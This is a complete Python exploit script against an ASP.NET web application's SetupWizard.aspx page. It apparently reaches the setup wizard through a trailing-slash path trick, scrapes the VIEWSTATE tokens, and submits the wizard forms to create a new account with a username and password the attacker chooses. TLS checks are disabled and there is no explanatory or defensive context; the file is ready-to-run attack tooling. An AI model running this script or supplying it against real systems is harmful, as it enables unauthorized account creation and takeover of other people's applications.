#!/usr/bin/python3
import argparse
import requests
from bs4 import BeautifulSoup

def exploit(base_url, username, password):
    s = requests.session()
    r = s.get(f"{base_url}/SetupWizard.aspx/", verify=False, timeout=30)
    if r.status_code == 200:
        print("[+] Appears vulnerable!")
    elif r.status_code == 302:
        print("[-] Got redirected - likely patched!")
    else:
        print("[-] Unexpected status code")

    data1 = {
        "__EVENTTARGET": "",
        "__EVENTARGUMENT": "",
        "__VIEWSTATE": "",
        "__VIEWSTATEGENERATOR": "",
        "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"
    }
    soup = BeautifulSoup(r.text, "html.parser")
    input_field = soup.find('input', {'name': '__VIEWSTATE'})
    data1['__VIEWSTATE'] = input_field['value']
    input_field = soup.find('input', {'name': '__VIEWSTATEGENERATOR'})
    data1['__VIEWSTATEGENERATOR'] = input_field['value']

    r = s.post(f"{base_url}/SetupWizard.aspx/", data=data1, verify=False, timeout=30)
    if r.status_code != 200:    
        print("[-] Unexpected status code")

    data2 = {
        "__LASTFOCUS": "",
        "__EVENTTARGET": "",
        "__EVENTARGUMENT": "",
        "__VIEWSTATE": "",
        "__VIEWSTATEGENERATOR": "",
        "ctl00$Main$wizard$userNameBox": f"{username}",
        "ctl00$Main$wizard$emailBox": f"{username}@test.local",
        "ctl00$Main$wizard$passwordBox": f"{password}",
        "ctl00$Main$wizard$verifyPasswordBox": f"{password}",
        "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"
    }
    soup = BeautifulSoup(r.text, "html.parser")
    input_field = soup.find('input', {'name': '__VIEWSTATE'})
    data2['__VIEWSTATE'] = input_field['value']
    input_field = soup.find('input', {'name': '__VIEWSTATEGENERATOR'})
    data2['__VIEWSTATEGENERATOR'] = input_field['value']

    r = s.post(f"{base_url}/SetupWizard.aspx/", data=data2, verify=False, timeout=30)
    if r.status_code == 200:
        print("[+] Added user to application!")
    else:
        print("[-] Unexpected status code")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The base URL of the target', required=True)
    parser.add_argument('-u', '--username', help='The username to add', required=True)
    parser.add_argument('-p', '--password', help='The new password', required=True)
    args = parser.parse_args()

    results = exploit(args.target, args.username, args.password)
